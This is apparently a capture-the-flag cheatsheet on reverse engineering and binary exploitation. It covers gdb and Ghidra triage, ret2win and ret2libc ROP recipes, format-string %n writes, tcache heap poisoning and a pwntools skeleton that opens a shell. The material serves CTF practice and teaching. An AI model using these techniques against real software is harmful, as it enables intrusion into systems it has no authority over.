# Reverse Engineering & Pwn Cheatsheet

> Tools: Ghidra, gdb+pwndbg/gef, radare2/rizin, `checksec`, `ropper`/`ROPgadget`, `one_gadget`,
> `pwntools`, `ltrace`/`strace`, `patchelf`. Template: `../scripts/pwn_template.py`.

# ──────────────── REVERSE ENGINEERING ────────────────

## Triage
```bash
file bin ; checksec --file=bin ; strings -n 6 bin | grep -iE 'flag|pass|key|LsCTF'
./bin            # just run it — understand the behaviour & expected input
ltrace ./bin ; strace ./bin        # library/syscall calls (strcmp reveals passwords!)
```
`ltrace` showing `strcmp(input, "s3cr3t")` *is* the answer sometimes.

## Static (Ghidra / radare2)
- Ghidra: import → auto-analyze → find `main` → read decompiled C. Rename vars, follow the check
  that gates the flag print. Look at `FUN_*` called from main.
- r2: `r2 -A bin` ; `afl` (list funcs) ; `pdf @ main` (disasm) ; `iz` (strings) ; `axt` (xrefs).
- Common gates: `if (input == constant)`, XOR/add loops transforming input, a checksum, a
  byte-by-byte compare to an obfuscated string → just reverse the transform.

## Dynamic (gdb)
```
gdb ./bin           # with pwndbg/gef
b main ; b *0x... ; run ; ni/si ; x/20xw $rsp ; p $rax
# patch a branch: set $eax=1 ; or write past a check with `set {int}0x..=..`
```
Flags built in memory at runtime: break after the build, dump the buffer.

## Common rev tricks
- **Packed?** `upx -d bin`. Entropy high → packed/encrypted section.
- **Anti-debug** (ptrace) → patch the ptrace call or `catch syscall ptrace` and set ret 0.
- **Keygen**: reverse the validation, write a generator. **VM/bytecode**: find the dispatch loop,
  map opcodes. **.NET/Java**: dnSpy / jadx — near-source decompilation.
- Angr for symbolic execution when the check is pure input→bool:
  `p=angr.Project('bin'); find=ADDR_win; avoid=ADDR_fail; ...`

# ──────────────── BINARY EXPLOITATION (PWN) ────────────────

## Recon
```bash
checksec --file=bin      # Canary? NX? PIE? RELRO?  -> dictates technique
file bin ; strings bin | grep -i /bin/sh ; nm bin | grep -i win
# find offset to return address:
cyclic 200   (pwndbg)  ->  run, crash  ->  cyclic -l <value in RIP>
```

## Technique by protection
| State | Go-to |
|-------|-------|
| `win()`/backdoor func exists | **ret2win**: overflow → overwrite RIP with win addr |
| NX off, no canary | shellcode on stack, jump to it |
| NX on, no PIE, libc known | **ret2libc** / ret2system, or ROP to `system("/bin/sh")` |
| NX on, PIE | leak an address first (format str / puts(GOT)) to defeat ASLR/PIE |
| Canary present | leak canary (format str / partial overwrite) then overflow past it |
| Full RELRO | can't GOT-overwrite; use ROP/ret2libc |

## ret2libc recipe (classic)
```python
# 1) leak libc: ROP -> puts(puts@got); then return to main to go again
# 2) libc base = leaked - libc.sym['puts']
# 3) second payload: ROP -> system("/bin/sh")  (need pop rdi; ret gadget)
```
`ropper -f bin --search 'pop rdi'` ; `one_gadget libc.so.6` for a single magic gadget.
Match libc: https://libc.blukat.me (paste leaked symbol last bytes).

## Format string
```
%p %p %p ...        # leak stack (find your input offset: AAAA %p %p -> see 41414141)
%7$p                # positional leak
%n writes: overwrite GOT entry / return addr with %<val>c%<off>$n (use pwntools fmtstr_payload)
```
`fmtstr_payload(offset, {got_addr: win_addr})` in pwntools does the math.

## Heap (if it comes up)
- UAF, double-free (tcache poisoning on glibc 2.27+), overlapping chunks. Know your glibc version.
  tcache dup → arbitrary write → overwrite `__free_hook`/`__malloc_hook` with system/one_gadget.

## pwntools essentials
```python
from pwn import *
context.binary = e = ELF('./bin'); libc = ELF('./libc.so.6')
p = process('./bin')        # or remote('host', port)
p.recvuntil(b'> '); p.sendline(payload)
p.sendline(flat({offset: p64(e.sym.win)}))     # ret2win in one line
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.interactive()
```
See `../scripts/pwn_template.py` — fill offset, switch LOCAL/REMOTE, done.
